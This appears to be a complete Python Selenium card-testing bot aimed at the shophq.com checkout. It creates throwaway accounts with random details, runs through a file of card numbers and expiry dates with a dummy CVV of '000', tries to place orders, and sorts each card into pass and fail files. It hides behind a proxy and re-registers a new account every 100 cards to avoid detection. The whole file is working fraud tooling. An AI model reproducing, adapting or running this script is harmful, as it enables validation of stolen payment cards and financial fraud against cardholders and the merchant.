import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
from generate import Generate
from browser import Browser
from selenium.webdriver.common.action_chains import ActionChains
import os

# Get the current folder
current_folder = os.getcwd()
def action_register(browser):
	generate = Generate()
	browser.open_page('https://www.shophq.com/Account/Register')
	time.sleep(3)
	
	first = generate.random_first_name()
	last = generate.random_last_name()
	email = generate.random_email(last)
	password = generate.random_password()
	print(first,last, email,password)
	browser.register(first_name=first, last_name=last,email=email,password=password)
	# check_register = True
	# while check_register:
		# loop when page finish
	page_loading= True
	while page_loading:
		page_loading = browser.page_loading()
		if page_loading==False :
			curentUrl = browser.browser.current_url
			if 'shophq.com/Account/RegisterConfirmation' not in curentUrl:
				if browser.check_Visible(by=By.ID, value='validate-email-proceed') == True :
					time.sleep(3)
					print('invalid email')
					# email = generate.random_email(last)
					print(first,last, email,password)
					browser.register_again(email=email)
					print('Register OK')
					print(f'{email}|{password}')
					with open(current_folder+'/account.txt', 'w') as f:
						f.write(f'{email}|{password}')
			else:
				print('Register OK')
				print(f'{email}|{password}')
				with open(current_folder+'/account.txt', 'w') as f:
					f.write(f'{email}|{password}')
					# check_register = False
	register = True
	while register:
		if 'shophq.com/Account/RegisterConfirmation' not in browser.browser.current_url:
			time.sleep(2)
		else:
			register =False
			print('ok continue')

def action_make_order(browser,url):
	browser.browser.get(url)
	try:
		browser.chooseTypeProduct(by=By.CSS_SELECTOR, value='li.color-box-container:first-of-type')
	except:
		print('not have type color')
	try:
		browser.chooseTypeProduct(by=By.CSS_SELECTOR, value='li.size-box-container:first-of-type')
	except:
		print('not have type size')
	
	time.sleep(2)
	browser.turn_off_modal(by=By.CLASS_NAME,value='pdp-promo-modal')
	browser.click_button(by=By.ID,value="btn-quick-buy-pdp")
	browser.turn_off_modal(by=By.CLASS_NAME,value='pdp-promo-modal')
	time.sleep(2)
	browser.turn_off_modal(by=By.CLASS_NAME,value='pdp-promo-modal')
def action_login(browser,mail,password):
	
	time.sleep(2)
	browser.login(mail,password)
	time.sleep(2)
def action_add_ship_address(browser,email,password,first_name,last_name,address,city,state,zip_code):
	browser.add_ship_address()
	time.sleep(2)
	page_loading= True
	while page_loading:
		page_loading = browser.page_loading()
		if page_loading==False :
			curentUrl = browser.browser.current_url
			if 'shophq.com/Account/Login' in curentUrl:
				browser.remove_input(By.ID,'PasswordEmail')
				action_login(browser,email,password)
	
	browser.add_input_js(by=By.ID,value='ShippingAddresses_SelectedAddress_FirstName',text=first_name)
	browser.add_input_js(by=By.ID,value='ShippingAddresses_SelectedAddress_LastName',text=last_name)
	browser.add_input_js(by=By.ID,value='ShippingAddresses_SelectedAddress_Address1',text=address)
	browser.add_input_js(by=By.ID,value='ShippingAddresses_SelectedAddress_City',text=city)
	browser.select_option('ShippingAddresses_SelectedAddress_State',state)
	browser.add_input_js(by=By.ID,value='ShippingAddresses_SelectedAddress_Zip',text=zip_code)
	
	check_address_button = browser.excute_js1('return $("#save-shipping-address-section > div:nth-child(11) > div > div > button.btn.btn-outline-primary.save-address-btn").length >0 ;')
	if check_address_button :
		add_address_button = browser.excute_js1('$("#save-shipping-address-section > div:nth-child(11) > div > div > button.btn.btn-outline-primary.save-address-btn").click();')
	check_address_button_overide = browser.excute_js1('return $("#save-shipping-address-section > div:nth-child(11) > div > div > button.btn.btn-outline-primary.save-override-address-btn").length > 0 ;')
	if check_address_button_overide :
	
		add_address_button = browser.excute_js1('$("#save-shipping-address-section > div:nth-child(11) > div > div > button.btn.btn-outline-primary.save-override-address-btn").click();')


def action_add_bill_address(browser,email,password,address,city,state,zip_code,phone):
	browser.add_bill_address()
	time.sleep(2)
	page_loading= True
	while page_loading:
		page_loading = browser.page_loading()
		if page_loading==False :
			curentUrl = browser.browser.current_url
			if 'shophq.com/Account/Login' in curentUrl:
				browser.remove_input(By.ID,'PasswordEmail')
				action_login(browser,email,password)
	
	browser.add_input_js(by=By.ID,value='BillingAddresses_SelectedAddress_Address1',text=address)
	browser.add_input_js(by=By.ID,value='BillingAddresses_SelectedAddress_City',text=city)
	browser.select_option('BillingAddresses_SelectedAddress_State',state)
	browser.add_input_js(by=By.ID,value='BillingAddresses_SelectedAddress_Zip',text=zip_code)
	browser.add_input_js(by=By.ID,value='PhoneNumber',text=phone)
	
	check_address_button = browser.excute_js1('return $("#save-billing-address-section > div:nth-child(11) > div > div > button.btn.btn-outline-primary.save-address-btn").length >0 ;')
	if check_address_button :
		add_address_button = browser.excute_js1('$("#save-billing-address-section > div:nth-child(11) > div > div > button.btn.btn-outline-primary.save-address-btn").click();')
	check_address_button_overide = browser.excute_js1('return $("#save-billing-address-section > div:nth-child(10) > div > div > button.btn.btn-outline-primary.save-address-btn").length >0 ;')
	if check_address_button_overide :
		add_address_button = browser.excute_js1('$("#save-billing-address-section > div:nth-child(10) > div > div > button.btn.btn-outline-primary.save-address-btn").click();')
	# try:
	# 	add_address_button = browser.excute_js1('$("#save-billing-address-section > div:nth-child(11) > div > div > button.btn.btn-outline-primary.save-override-address-btn").click();')
	# except:
	# 	print('ok bill address')
		


def action_add_creadit(browser,number:str,month:str,year:str):

	print('start click')
	while True:
		if browser.page_loading() :
			time.sleep(4)
		else:
			break
	print('load ok')
	check_error = browser.excute_js1('return $("#checkout-error").length > 0;')
	
	if check_error:
		print('if')
		loop = True
		while loop:
			while True:
				if browser.page_loading() :
					time.sleep(4)
				else:
					break
			print('load ok')
			click_edit = browser.excute_js1('$("#payment-collapse-button-title").click()')
			time.sleep(5)
			try:
				wait = WebDriverWait(browser.browser, 30)
				wait.until(EC.presence_of_element_located((By.ID, 'ifmCCForm')))
				element = browser.browser.find_element(By.ID,'ifmCCForm')
			except:
				print('refresh')
				browser.browser.refresh()
				wait = WebDriverWait(browser.browser, 30)
				wait.until(EC.presence_of_element_located((By.ID, 'ifmCCForm')))
				element = browser.browser.find_element(By.ID,'ifmCCForm')

			browser.browser.switch_to.frame(element)
			
			print('ok')
			# buttonn1 = browser.browser.find_element(by=By.ID, value='cphBody_optCreditCards')
			# print(buttonn1)
			# buttonn1.click()
			reFresh = True
			i=0
			while i<10:
				i+=1
				
				exists = browser.excute_js1('return $("#tblCCForm > tbody > tr:nth-child(8) > td > span > label").length > 0;')
				print(exists)
				time.sleep(3)
				if exists:
					print('da click')
					browser.excute_js1('$("#tblCCForm > tbody > tr:nth-child(8) > td > span > label").click();')
					reFresh = False
					loop = False
					time.sleep(3)
					break
			if reFresh:
				print('refresh')
				browser.browser.refresh()

		print('ok')
		time.sleep(2)
		print('start add')
		
		wait = WebDriverWait(browser.browser, 10)
		wait.until(EC.presence_of_element_located((By.ID, 'braintree-hosted-field-number')))
		element_cc_iframe = browser.browser.find_element(By.ID, 'braintree-hosted-field-number')
		browser.browser.switch_to.frame(element_cc_iframe)
		time.sleep(3)
		browser.add_input(By.ID,'credit-card-number',number)
		print('Add cc number OK')
		time.sleep(3)

		browser.browser.switch_to.default_content()
		browser.browser.switch_to.frame(element)
		wait = WebDriverWait(browser.browser, 10)
		wait.until(EC.presence_of_element_located((By.ID, 'braintree-hosted-field-expirationMonth')))
		element_month_iframe = browser.browser.find_element(By.ID, 'braintree-hosted-field-expirationMonth')
		browser.browser.switch_to.frame(element_month_iframe)
		browser.add_input(By.ID,'expiration-month',month)
		print('Add month  OK')
		time.sleep(3)

		browser.browser.switch_to.default_content()
		browser.browser.switch_to.frame(element)
		wait = WebDriverWait(browser.browser, 10)
		wait.until(EC.presence_of_element_located((By.ID, 'braintree-hosted-field-expirationYear')))
		element_year_iframe = browser.browser.find_element(By.ID, 'braintree-hosted-field-expirationYear')
		browser.browser.switch_to.frame(element_year_iframe)
		browser.add_input(By.ID,'expiration-year',year)
		print('Add year  OK')
		time.sleep(3)
		
		browser.browser.switch_to.default_content()
		browser.browser.switch_to.frame(element)
		wait = WebDriverWait(browser.browser, 10)
		wait.until(EC.presence_of_element_located((By.ID, 'cc_cvv')))
		element_cvv_parent_iframe = browser.browser.find_element(By.ID, 'cc_cvv')
		wait.until(EC.presence_of_element_located((By.ID, 'braintree-hosted-field-cvv')))
		element_cvv_iframe = element_cvv_parent_iframe.find_element(By.ID, 'braintree-hosted-field-cvv')
		browser.browser.switch_to.frame(element_cvv_iframe)
		browser.add_input_1(By.NAME,'cvv','000')
		print('Add ccv  OK')
		time.sleep(3)

		print('start click save')
		browser.browser.switch_to.default_content()
		browser.browser.switch_to.frame(element)
		print('Current iframe',browser.browser.current_url)
		browser.excute_js2('$("#btnSaveCreditCard").click();')
		browser.browser.switch_to.default_content()
		print('Current iframe',browser.browser.current_url)
		
	else:
		print('Else')
		loop = True
		while loop:
			while True:
				if browser.page_loading() :
					time.sleep(4)
				else:
					break
			print('load ok')
			time.sleep(2)
			try:
				wait = WebDriverWait(browser.browser, 30)
				wait.until(EC.presence_of_element_located((By.ID, 'ifmCCForm')))
				element = browser.browser.find_element(By.ID,'ifmCCForm')
			except:
				print('refresh')
				browser.browser.refresh()
				wait = WebDriverWait(browser.browser, 30)
				wait.until(EC.presence_of_element_located((By.ID, 'ifmCCForm')))
				element = browser.browser.find_element(By.ID,'ifmCCForm')

			browser.browser.switch_to.frame(element)
			
			print('ok')
			# buttonn1 = browser.browser.find_element(by=By.ID, value='cphBody_optCreditCards')
			# print(buttonn1)
			# buttonn1.click()
			reFresh = True
			i=0
			while i<10:
				i+=1
				exists_card = browser.excute_js1('return $("#tblCCForm > tbody > tr:nth-child(8) > td > span > label").length > 0;')
				if exists_card:
					exists = browser.excute_js1('return $("#tblCCForm > tbody > tr:nth-child(8) > td > span > label").length > 0;')
					print(exists)
					time.sleep(5)
					if exists:
						print('da click')
						browser.excute_js1('$("#tblCCForm > tbody > tr:nth-child(8) > td > span > label").click();')
						reFresh = False
						loop = False
						time.sleep(5)
						break
				
				else:
					exists = browser.excute_js1('return $("#cphBody_optCreditCards").length > 0;')
					print(exists)
					time.sleep(5)
					if exists:
						print('da click')
						browser.excute_js2('$("#cphBody_optCreditCards").click();')
						reFresh = False
						loop = False
						break
			if reFresh:
				print('refresh')
				browser.browser.refresh()

		print('ok')
		time.sleep(3)
		print('start add')
		wait = WebDriverWait(browser.browser, 10)
		wait.until(EC.presence_of_element_located((By.ID, 'braintree-hosted-field-number')))
		element_cc_iframe = browser.browser.find_element(By.ID, 'braintree-hosted-field-number')
		browser.browser.switch_to.frame(element_cc_iframe)
		
		browser.add_input(By.ID,'credit-card-number',number)
		print('Add cc number OK')
		time.sleep(3)

		browser.browser.switch_to.default_content()
		browser.browser.switch_to.frame(element)
		wait = WebDriverWait(browser.browser, 10)
		wait.until(EC.presence_of_element_located((By.ID, 'braintree-hosted-field-expirationMonth')))
		element_month_iframe = browser.browser.find_element(By.ID, 'braintree-hosted-field-expirationMonth')
		browser.browser.switch_to.frame(element_month_iframe)
		browser.add_input(By.ID,'expiration-month',month)
		print('Add month  OK')
		time.sleep(3)

		browser.browser.switch_to.default_content()
		browser.browser.switch_to.frame(element)
		wait = WebDriverWait(browser.browser, 10)
		wait.until(EC.presence_of_element_located((By.ID, 'braintree-hosted-field-expirationYear')))
		element_year_iframe = browser.browser.find_element(By.ID, 'braintree-hosted-field-expirationYear')
		browser.browser.switch_to.frame(element_year_iframe)
		browser.add_input(By.ID,'expiration-year',year)
		print('Add year  OK')
		time.sleep(3)
		
		browser.browser.switch_to.default_content()
		browser.browser.switch_to.frame(element)
		wait = WebDriverWait(browser.browser, 10)
		wait.until(EC.presence_of_element_located((By.ID, 'cc_cvv')))
		element_cvv_parent_iframe = browser.browser.find_element(By.ID, 'cc_cvv')
		wait.until(EC.presence_of_element_located((By.ID, 'braintree-hosted-field-cvv')))
		element_cvv_iframe = element_cvv_parent_iframe.find_element(By.ID, 'braintree-hosted-field-cvv')
		browser.browser.switch_to.frame(element_cvv_iframe)

		print(element_cvv_iframe)
		
		# Scroll the element into view using JavaScript
		
		browser.add_input_1(By.NAME,'cvv','000')
		print('Add ccv  OK')
		time.sleep(3)

		print('start click save')
		browser.browser.switch_to.default_content()
		browser.browser.switch_to.frame(element)
		print('Current iframe',browser.browser.current_url)
		browser.excute_js2('$("#btnSaveCreditCard").click();')
		browser.browser.switch_to.default_content()
		print('Current iframe',browser.browser.current_url)
		time.sleep(10)
		
def action_place_my_order(browser):
	browser.browser.switch_to.default_content()
	
	# try:
	# 	browser.excute_js1('$("#PlaceOrderFormTop > button").click();')
	# except:
	# 	browser.excute_js1('$("#PlaceOrderForm > button > button").click();')
	print('start action_place_my_order')
	time.sleep(3)
	try:
		wait = WebDriverWait(browser.browser, 15)
		wait.until(EC.presence_of_element_located((By.ID, 'btnPlaceOrder')))
		element_order_parent_iframe = browser.browser.find_element(By.ID, 'btnPlaceOrder')
		html = element_order_parent_iframe.get_attribute('outerHTML')

		# Print the HTML
		print(html)
		wait = WebDriverWait(browser.browser, 15)
		wait.until(EC.presence_of_element_located((By.TAG_NAME, 'button')))
		button_order = element_order_parent_iframe.find_element(By.TAG_NAME,"button")
		html_button_order = button_order.get_attribute('outerHTML')

		# Print the HTML
		print(html_button_order)
		check_disabled = button_order.get_attribute("disabled")
		print(check_disabled)
		if check_disabled:
			wait = WebDriverWait(browser.browser, 15)
			wait.until(EC.presence_of_element_located((By.ID, 'btnPlaceOrderTop')))
			element_order_parent_iframe = browser.browser.find_element(By.ID, 'btnPlaceOrderTop')
			html = element_order_parent_iframe.get_attribute('outerHTML')

			# Print the HTML
			print(html)
			wait = WebDriverWait(browser.browser, 15)
			wait.until(EC.presence_of_element_located((By.TAG_NAME, 'button')))
			button_order = element_order_parent_iframe.find_element(By.TAG_NAME,"button")
			html_button_order = button_order.get_attribute('outerHTML')

			# Print the HTML
			print(html_button_order)
		else:
			button_order.click()
	except :
		print('not click order')
	time.sleep(3)
def save_result_pass(line):
	with open(current_folder+'/result_pass.txt', 'a') as f:
		f.write('\n'+ line)
def save_result_fail(line):
	with open(current_folder+'/result_fail.txt', 'a') as f:
		f.write('\n'+ line)
def getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone):
	page_loading= True
	while page_loading:
		page_loading = browser.page_loading()
		if page_loading==False :
			try:
				action_make_order(browser,urls[0])
			except:
				action_make_order(browser,urls[1])
		time.sleep(3)

	quick_buy_check = True
	while quick_buy_check:
		if 'shophq.com/Checkout/QuickBuy' not in browser.browser.current_url:
			browser.turn_off_modal(by=By.CLASS_NAME,value='pdp-promo-modal')
			time.sleep(2)
		else:
			browser.turn_off_modal(by=By.CLASS_NAME,value='pdp-promo-modal')
			quick_buy_check =False
			print('ok continue')
	page_loading= True
	while page_loading:
		page_loading = browser.page_loading()

		if page_loading==False :
			curentUrl = browser.browser.current_url
			if 'shophq.com/Checkout/QuickBuy' in curentUrl:
				# try:
				print(check_box_exist_info)
				if check_box_exist_info == "0" or check_box_exist_info ==0:
					browser.turn_off_modal(by=By.CLASS_NAME,value='pdp-promo-modal')
					action_add_ship_address(browser,email,password,first_name,last_name,address,city,state,zip_code)		
					time.sleep(3)
					# except :
						
					# 	print('Da co thong tin ship address')
					# try:
					browser.turn_off_modal(by=By.CLASS_NAME,value='pdp-promo-modal')
					action_add_bill_address(browser,email,password,address,city,state,zip_code,phone)	
					time.sleep(3)
				# except:
				# 	print('Da co thong tin bill address')
			elif 'https://www.shophq.com/Account/Login' in curentUrl:
				try:
					action_login(browser,email,password)
				except:
					print('Not')
			else:
				time.sleep(6)
				print('Not make order')
		time.sleep(3)
def run():
	urls = []

	# Read each line of the file and append to the urls array
	with open(current_folder+'/url_product.txt', 'r') as f:
		for line in f:
			url = line.strip()
			urls.append(url)
	print(urls)
	# Load the first URL using the webdriver object
	with open(current_folder+'/account.txt', 'r') as f:
		for line in f:
			email, password = line.strip().split('|')
			email = email.replace(' ','')
			password= password.replace(' ','')
	print(email,password)
	form_ship_address = []
	with open(current_folder+'/ship_address.txt', 'r') as f:
		for line in f:
			# Split the line into separate fields
			raw = line.strip()
			form_ship_address.append(raw)
			# Extract the individual fields
	print(form_ship_address)
	first_name = form_ship_address[0]
	last_name = form_ship_address[1]
	address = form_ship_address[2]
	city = form_ship_address[3]
	state = form_ship_address[4]
	zip_code = form_ship_address[5]
	phone = form_ship_address[6]
	check_box_exist_info = form_ship_address[7]
	list_creadit = []
	
	with open(current_folder+'/credit.txt', 'r') as f:
		for line in f:
			number, month, year = line.strip().split('|')
			list_creadit.append([number, month, year])
	with open(current_folder+'/proxy.txt', 'r') as f:
		for line in f:
			check_proxy, proxy = line.strip().split('|')
			check_proxy = check_proxy.replace(' ','')
			proxy= proxy.replace(' ','')

	browser = Browser(current_folder+'/drivers/chromedriver.exe',check_proxy=check_proxy,proxy=proxy)
	# Register Account
	# action_register(browser)
	browser.open_page('https://www.shophq.com/Account/Login')
	action_login(browser,email,password)
	time.sleep(2)
	page_loading =True
	while page_loading:
		page_loading = browser.page_loading()
		if page_loading==False :
			curentUrl = browser.browser.current_url
			if 'www.shophq.com/?SignInSuccess=true' not in curentUrl:
				action_register(browser)
	time.sleep(2)
	
	# go to product and Buy
	print(browser.browser.current_url)
	getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone)
	
	for i in range(len(list_creadit)):
		# try:
		if i!=0 and i % 100==0:
			while True:
				if browser.page_loading() :
					time.sleep(4)
				else:
					break
			action_register(browser)
			getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone)
		number = list_creadit[i][0]
		month = list_creadit[i][1]
		year = list_creadit[i][2]
		time.sleep(3)
		while True:
			try:
				action_add_creadit(browser,number,month,year)
				break
			except:
				print('refresh')
				browser.browser.switch_to.default_content()

				print('Current iframe',browser.browser.current_url)
				wait = WebDriverWait(browser.browser, 30)
				wait.until(EC.presence_of_element_located((By.ID, 'ifmCCForm')))
				element = browser.browser.find_element(By.ID,'ifmCCForm')

				browser.browser.switch_to.frame(element)
				browser.browser.refresh()
				# browser.browser.get(browser.browser.current_url)
				
			
		while True:
				if browser.page_loading() :
					time.sleep(4)
				else:
					break
		time.sleep(15)
		try:
			action_place_my_order(browser)
		except:
			print('Not make order')
		while True:
				if browser.page_loading() :
					time.sleep(4)
				else:
					time.sleep(10)
					break
		
		# if 'shophq.com/Checkout/PlaceOrder' in browser.browser.current_url or 'www.shophq.com/Checkout/QuickBuy' in browser.browser.current_url:
		try:
			wait = WebDriverWait(browser.browser, 30)
			wait.until(EC.presence_of_element_located((By.ID, 'checkout-error')))
			browser.browser.find_element(By.ID,'checkout-error')
			print('Khong thanh toan duoc')
			line= f'{number}|{month}|{year}|fail'
			save_result_fail(line)
		except  :
			print('thanh toan duoc không hiện lỗi')
			line= f'{number}|{month}|{year}|pass'
			save_result_pass(line)
			getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone)
		print('Current iframe',browser.browser.current_url)
		browser.browser.switch_to.default_content()
		wait = WebDriverWait(browser.browser, 30)
		wait.until(EC.presence_of_element_located((By.ID, 'ifmCCForm')))
		element = browser.browser.find_element(By.ID,'ifmCCForm')

		browser.browser.switch_to.frame(element)
		browser.browser.refresh()
		# else:
		# 	print('thanh toan duoc sang url mới')
		# 	line= f'{number}|{month}|{year}|pass'
		# 	save_result_pass(line)
		# 	getproduct_add(browser,urls,check_box_exist_info,email,password,first_name,last_name,address,city,state,zip_code,phone)
	browser.close_browser()
	
